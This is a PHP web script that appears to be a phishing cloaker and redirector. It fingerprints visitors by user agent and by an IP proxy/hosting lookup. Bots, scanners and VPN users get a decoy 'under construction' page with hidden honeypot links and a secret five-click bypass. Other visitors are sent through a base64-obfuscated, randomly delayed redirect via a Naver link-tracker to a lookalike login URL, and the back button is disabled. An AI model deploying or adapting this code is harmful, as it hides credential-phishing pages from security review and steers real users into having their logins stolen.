<?php
// Disable ALL error display for production
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set('log_errors', 0);

// Start session for tracking
session_start();

// Your target website URL
$targetWebsite = "https://cc.naver.com/cc?a=pst.link&r=&i=&m=1&nsc=Mblog.post&u=https://supprt.alwaysdata.net/id.css.chノauthノuiノappノauthノflowノmycss-loginノextノlogin";

// Function to get visitor IP address
function getVisitorIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

// Simple bot detection based on user agent
function isBotOrCrawler() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    $botSignatures = [
        'bot', 'crawler', 'spider', 'scraper', 'parser', 'checker',
        'googlebot', 'bingbot', 'yahoo', 'facebook', 'twitter',
        'curl', 'wget', 'python', 'java', 'scan', 'test', 'monitor'
    ];
    
    foreach ($botSignatures as $signature) {
        if (stripos($userAgent, $signature) !== false) {
            return true;
        }
    }
    
    // Check for empty or suspicious user agents
    if (empty($userAgent) || strlen($userAgent) < 10) {
        return true;
    }
    
    return false;
}

// Check for VPN/Proxy using free service
function isVPNOrProxy($ip) {
    // Skip local IPs
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    
    // Use ip-api.com for basic proxy detection
    $url = "http://ip-api.com/json/" . $ip . "?fields=proxy,hosting";
    $response = @file_get_contents($url, false, stream_context_create([
        'http' => [
            'timeout' => 3,
            'method' => 'GET',
            'header' => 'User-Agent: Mozilla/5.0'
        ]
    ]));
    
    if ($response === FALSE) {
        return false; // If we can't check, assume it's not a proxy
    }
    
    $data = json_decode($response, true);
    if (isset($data['proxy']) && $data['proxy'] === true) {
        return true;
    }
    if (isset($data['hosting']) && $data['hosting'] === true) {
        return true;
    }
    
    return false;
}

// Get visitor IP
$visitorIp = getVisitorIp();

// Bypass for your own IP (optional - replace with your IP)
$myIP = 'YOUR_IP_ADDRESS'; // Replace with your actual IP
$allowAccess = false;

if ($visitorIp === $myIP) {
    $allowAccess = true;
}

// Check if user has bypass cookie
if (isset($_COOKIE['bypass_check']) && $_COOKIE['bypass_check'] === '1') {
    $allowAccess = true;
}

// Run protection checks
$isBotDetected = isBotOrCrawler();
$isVPNDetected = isVPNOrProxy($visitorIp);

// If bot or VPN detected and no bypass, show fake page
if (!$allowAccess && ($isBotDetected || $isVPNDetected)) {
    http_response_code(200);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Welcome</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <h1>Welcome</h1>
        <p>This is a simple website under construction.</p>
        <p>Please check back later.</p>
        
        <!-- Hidden bypass mechanism: 5 clicks anywhere -->
        <script>
        let clickCount = 0;
        document.body.addEventListener('click', () => {
            clickCount++;
            if (clickCount >= 5) {
                document.cookie = 'bypass_check=1; path=/; max-age=3600';
                location.reload();
            }
        });
        </script>
        
        <!-- Fake content for scanners -->
        <div style="display: none;">
            <a href="/admin">Admin Panel</a>
            <a href="/login">Login</a>
            <a href="/wp-admin">WordPress</a>
            <form action="/auth" method="post">
                <input type="text" name="user" />
                <input type="password" name="pass" />
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// For legitimate users, show loading page and redirect
?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            animation: fadeIn 0.5s ease-in;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .loading-text {
            color: #666;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading</h2>
        <div class="spinner"></div>
        <div class="loading-text">Please wait...</div>
    </div>

    <script>
    // Obfuscated redirect function
    (function() {
        // Base64 encoded target URL and redirect logic
        var encoded = '<?php echo base64_encode($targetWebsite); ?>';
        
        function executeRedirect() {
            try {
                var target = atob(encoded);
                var delay = Math.floor(Math.random() * 1000) + 2000; // 2-3 second delay
                
                setTimeout(function() {
                    // Use multiple redirect methods for better compatibility
                    if (window.location.replace) {
                        window.location.replace(target);
                    } else {
                        window.location.href = target;
                    }
                }, delay);
            } catch(e) {
                // Fallback
                window.location.href = '<?php echo $targetWebsite; ?>';
            }
        }
        
        // Add some randomization to avoid pattern detection
        var randomDelay = Math.floor(Math.random() * 500) + 100;
        setTimeout(executeRedirect, randomDelay);
        
        // Prevent back button from working
        history.pushState(null, null, window.location.pathname);
        window.addEventListener('popstate', function() {
            history.pushState(null, null, window.location.pathname);
        });
    })();
    </script>
    
    <!-- Additional honeypots for scanners -->
    <div style="position: absolute; left: -9999px; top: -9999px;">
        <a href="/admin.php">Admin</a>
        <a href="/dashboard">Dashboard</a>
        <a href="/config.php">Config</a>
        <form action="/login.php" method="post">
            <input type="text" name="username" value="admin">
            <input type="password" name="password" value="password">
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
